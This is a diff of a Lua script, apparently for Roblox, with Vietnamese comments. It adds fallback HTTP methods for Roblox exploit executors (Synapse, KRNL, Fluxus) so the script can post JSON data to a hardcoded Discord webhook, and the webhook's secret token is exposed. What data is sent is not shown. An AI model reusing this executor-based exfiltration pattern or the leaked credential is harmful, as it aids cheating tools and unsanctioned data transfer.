@@ -48,40 +48,75 @@ local function sendToWebhook(data)
         return
     end
     
-    -- FIXED: Đảm bảo URL là HTTPS
     local url = "https://discord.com/api/webhooks/972059328276201492/DPHtxfsIldI5lND2dYUbA8WIZwp4NLYsPDG1Sy6-MKV9YMgV8OohcTf-00SdLmyMpMFC"
     local body = HttpService:JSONEncode({content = "```json\n"..HttpService:JSONEncode(data).."\n```"})
     
-    print("WEBHOOK: Đang gửi data:", HttpService:JSONEncode(data))
+    print("WEBHOOK: Đang test các methods...")
     
-    -- Method 1: Thử PostAsync (server-side)
-    local success, result = pcall(function()
+    -- Method 1: syn.request (Synapse)
+    if typeof(syn) == "table" and syn.request then
+        local success1, result1 = pcall(function()
+            return syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end)
+        if success1 then
+            print("WEBHOOK: syn.request thành công!")
+            return
+        else
+            print("WEBHOOK: syn.request thất bại:", result1)
+        end
+    end
+    
+    -- Method 2: http_request (Universal)
+    if typeof(http_request) == "function" then
+        local success2, result2 = pcall(function()
+            return http_request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end)
+        if success2 then
+            print("WEBHOOK: http_request thành công!")
+            return
+        else
+            print("WEBHOOK: http_request thất bại:", result2)
+        end
+    end
+    
+    -- Method 3: request (KRNL/Fluxus)
+    if typeof(request) == "function" then
+        local success3, result3 = pcall(function()
+            return request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end)
+        if success3 then
+            print("WEBHOOK: request thành công!")
+            return
+        else
+            print("WEBHOOK: request thất bại:", result3)
+        end
+    end
+    
+    -- Method 4: HttpService PostAsync (fallback)
+    local success4, result4 = pcall(function()
         return HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
     end)
     
-    if success then
-        print("WEBHOOK: PostAsync thành công! Response:", result)
-        return
+    if success4 then
+        print("WEBHOOK: HttpService thành công!")
     else
-        print("WEBHOOK: PostAsync thất bại:", result)
-    end
-    
-    -- Method 2: Thử RequestAsync (universal method)
-    local requestSuccess, requestResult = pcall(function()
-        return HttpService:RequestAsync({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = body
-        })
-    end)
-    
-    if requestSuccess then
-        print("WEBHOOK: RequestAsync thành công! Status:", requestResult.StatusCode)
-    else
-        print("WEBHOOK: RequestAsync cũng thất bại:", requestResult)
+        print("WEBHOOK: Tất cả methods đều thất bại. Lỗi cuối:", result4)
+        print("WEBHOOK: Có thể executor không hỗ trợ HTTP hoặc Discord block IP")
     end
 end
 
